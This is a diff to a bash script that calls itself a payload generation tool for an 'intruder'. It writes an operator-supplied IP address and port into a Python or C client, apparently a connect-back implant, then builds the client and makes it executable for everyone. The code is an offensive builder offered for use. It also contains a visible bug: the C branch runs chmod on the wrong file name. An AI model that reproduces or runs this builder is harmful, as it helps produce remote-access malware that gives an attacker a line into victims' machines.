@@ -1,19 +1,20 @@
 #!/usr/bin/env bash
 
 display_help() {
-        echo -e "usage: ./generate_intruder ip_address port\n
+        echo -e "usage: ./generate_intruder language ip_address port\n
 Intruder's payload generation tool\n
 positional arguments:
-  ip_address
-  port
+  language\t\tSelect the language you want the program to work with. Available: 'c', 'python'.
+  ip_address\t\tSpecify the IP address of the server the client will connect to
+  port\t\t\tSpecify the port of the server the client will connect to
 
 options:
   -h, --help\t\tshows this message"
 }
 
-generate() {
-	ip=$1
-	port=$2
+generate_python() {
+	ip=$2
+	port=$3
 	sed -E "s/(HOST *= *)\"[^\"]*\"/\1\"$ip\"/" intruder.py > tmp_intruder.txt
 	sed -E "s/(PORT *= *)\"[^\"]*\"/\1$port/" tmp_intruder.txt > tmp_intruder2.txt
 	mv tmp_intruder2.txt intruder.py
@@ -26,11 +27,23 @@ generate() {
 	chmod 777 intruder
 }
 
+generate_c() {
+	ip=$2
+	port=$3
+	sed -E "s/(HOST *)\"[^\"]*\"/\1\"$ip\"/" intrunix.c > tmp_intruder.txt
+	sed -E "s/(PORT *)\"[^\"]*\"/\1$port/" tmp_intruder.txt > tmp_intruder2.txt
+	mv tmp_intruder2.txt intrunix.c
+	gcc intrunix.c -o intrunix
+	chmod 777 intruder
+}
+
 main() {
 	if [[ $1 == "-h" || $1 == "--help" ]]; then
 		display_help
-	elif [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ && $2 =~ ^[0-9]{1,5}$ ]]; then
-		generate "$@"
+	elif [[ $1 == "python" && $2 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ && $3 =~ ^[0-9]{1,5}$ ]]; then
+		generate_python "$@"
+	elif [[ $1 == "c" && $2 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ && $3 =~ ^[0-9]{1,5}$ ]]; then
+		generate_c "$@"
 	else
 		echo -e "One or more arguments are incorrect.\nPlease use \"-h\" to display the help.\n"
 	fi
